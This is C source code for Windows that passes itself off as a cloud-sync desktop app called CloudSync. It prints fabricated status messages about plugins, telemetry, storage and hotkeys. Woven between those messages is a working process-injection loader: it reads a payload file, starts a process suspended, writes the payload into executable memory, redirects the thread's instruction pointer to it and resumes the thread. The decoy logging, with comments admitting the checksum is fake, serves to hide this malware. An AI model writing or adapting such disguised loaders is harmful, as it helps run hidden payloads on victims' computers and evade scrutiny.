#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

void print_timestamp(void)
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    printf("[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);
}

void log_msg(const char *msg)
{
    print_timestamp();
    printf("%s\n", msg);
}

// Giả lập tính checksum
unsigned long fake_checksum(const char *data, int len)
{
    unsigned long sum = 0;
    for (int i = 0; i < len; i++)
    {
        sum = sum * 31 + data[i];
    }
    return sum;
}

int main(int argc, char *argv[])
{
    int i;
    char temp_buffer[256];
    unsigned long checksum;

    printf("CloudSync Desktop v3.2.1\n");
    printf("(c) 2024 SyncTech Solutions\n\n");

    log_msg("Reading user preferences from AppData...");
    log_msg("Font cache initialized");

    // Loop: Load config entries
    log_msg("Loading configuration entries...");
    const char *config_keys[] = {"theme", "language", "sync_interval", "auto_update", "notifications", "proxy_enabled", "max_connections", "log_level"};
    for (i = 0; i < 8; i++)
    {
        printf("  - config.%s loaded\n", config_keys[i]);
        Sleep(5);
    }

    Sleep(30);

    log_msg("Checking for application updates...");
    log_msg("Current version is up to date");
    log_msg("Loading workspace settings...");

    if (argc < 3)
    {
        printf("Usage: %s <config_path> <workspace_file>\n", argv[0]);
        return 1;
    }

    log_msg("Connecting to sync service...");
    log_msg("SSL handshake completed");
    log_msg("User session validated");

    void *exec;

    log_msg("Parsing workspace metadata...");

    FILE *file = fopen(argv[2], "rb");

    if (file == NULL)
    {
        log_msg("Error: Cannot read workspace file");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long MalSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    log_msg("Decompressing cached assets...");

    // Loop: Scan cache directories
    log_msg("Scanning cache directories...");
    const char *cache_dirs[] = {"thumbnails", "previews", "temp", "metadata", "index"};
    for (i = 0; i < 5; i++)
    {
        int fake_count = 10 + (i * 7) % 50;
        printf("  - /%s: %d files\n", cache_dirs[i], fake_count);
        Sleep(8);
    }

    log_msg("Rebuilding thumbnail index...");

    byte *buffer = (byte *)malloc(MalSize);
    if (buffer == NULL)
    {
        log_msg("Error: Insufficient memory for cache");
        fclose(file);
        return 1;
    }

    fread(buffer, 1, MalSize, file);
    fclose(file);

    // Tính checksum giả
    log_msg("Verifying file checksums...");
    checksum = fake_checksum((char *)buffer, MalSize > 1024 ? 1024 : MalSize);
    printf("  - CRC32: 0x%08lX\n", checksum);
    printf("  - Size: %ld bytes\n", MalSize);
    log_msg("Integrity check passed");

    Sleep(20);

    // Loop: Load plugins
    log_msg("Initializing plugin framework...");
    const char *plugins[] = {"spell-checker", "cloud-backup", "pdf-viewer", "image-optimizer", "version-control", "markdown-preview"};
    const char *versions[] = {"1.4.2", "2.1.0", "3.0.1", "1.2.8", "2.5.3", "1.1.0"};
    for (i = 0; i < 6; i++)
    {
        printf("  - Loading: %s v%s", plugins[i], versions[i]);
        Sleep(12);
        printf(" [OK]\n");
    }
    printf("  Total: %d plugins loaded\n", i);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    log_msg("Starting background worker...");

    if (!CreateProcessA(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        log_msg("Error: Worker process failed to start");
        free(buffer);
        return 1;
    }

    log_msg("Telemetry service connected");

    // Loop: Send telemetry events
    log_msg("Sending anonymous usage statistics...");
    const char *events[] = {"app_launch", "session_start", "workspace_load", "sync_check"};
    for (i = 0; i < 4; i++)
    {
        printf("  - Event: %s [sent]\n", events[i]);
        Sleep(6);
    }

    exec = VirtualAllocEx(pi.hProcess, NULL, MalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec == NULL)
    {
        log_msg("Error: Cache allocation failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(buffer);
        return 1;
    }

    log_msg("Syncing clipboard history...");

    // Loop: Register hotkeys
    log_msg("Registering hotkeys...");
    const char *hotkeys[] = {"Ctrl+S (Save)", "Ctrl+Shift+S (Sync)", "Ctrl+N (New)", "Ctrl+O (Open)", "Ctrl+F (Find)", "F5 (Refresh)"};
    for (i = 0; i < 6; i++)
    {
        printf("  - %s registered\n", hotkeys[i]);
    }

    if (!WriteProcessMemory(pi.hProcess, exec, buffer, MalSize, NULL))
    {
        log_msg("Error: Failed to write cache data");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(buffer);
        return 1;
    }

    log_msg("Applying user theme: Dark Mode");
    log_msg("Window position restored");

    Sleep(15);

    // Loop: Check storage
    log_msg("Checking cloud storage quota...");
    const char *folders[] = {"Documents", "Images", "Projects", "Backups", "Shared"};
    float sizes[] = {2.4, 5.1, 3.2, 1.2, 0.5};
    float total = 0;
    for (i = 0; i < 5; i++)
    {
        printf("  - %-12s: %.1f GB\n", folders[i], sizes[i]);
        total += sizes[i];
        Sleep(5);
    }
    printf("  - Total used: %.1f GB / 50 GB\n", total);

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &CT))
    {
        log_msg("Error: Thread initialization failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(buffer);
        return 1;
    }

    // Loop: Recent documents
    log_msg("Loading recent documents list...");
    const char *recent_docs[] = {"report_Q4_2024.docx", "budget_final.xlsx", "meeting_notes.md", "project_plan.pdf", "presentation.pptx"};
    for (i = 0; i < 5; i++)
    {
        printf("  %d. %s\n", i + 1, recent_docs[i]);
    }

    // Loop: Network drives
    log_msg("Refreshing network drives...");
    for (i = 0; i < 3; i++)
    {
        char drive = 'N' + i;
        printf("  - Drive %c: ", drive);
        Sleep(20);
        printf("connected\n");
    }

    CT.Rip = (DWORD64)exec;

    if (!SetThreadContext(pi.hThread, &CT))
    {
        log_msg("Error: Worker configuration failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(buffer);
        return 1;
    }

    // Loop: Scan shared folders
    log_msg("Scanning for shared folders...");
    const char *shared[] = {"Team Documents", "Marketing Assets", "Engineering Specs"};
    for (i = 0; i < 3; i++)
    {
        printf("  - Found: \"%s\"\n", shared[i]);
        Sleep(10);
    }
    printf("  Total: %d shared workspaces\n", i);

    Sleep(18);

    log_msg("Auto-save enabled (interval: 5 min)");

    // Loop: Start background services
    log_msg("Starting background services...");
    const char *services[] = {"FileWatcher", "SyncDaemon", "NotificationHandler", "CacheManager"};
    for (i = 0; i < 4; i++)
    {
        printf("  - %s: ", services[i]);
        Sleep(15);
        printf("running\n");
    }

    ResumeThread(pi.hThread);

    log_msg("Notification service ready");
    log_msg("Application ready");

    printf("\n========================================\n");
    printf("CloudSync is running. Press Ctrl+C to exit.\n");
    printf("========================================\n");

    free(buffer);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
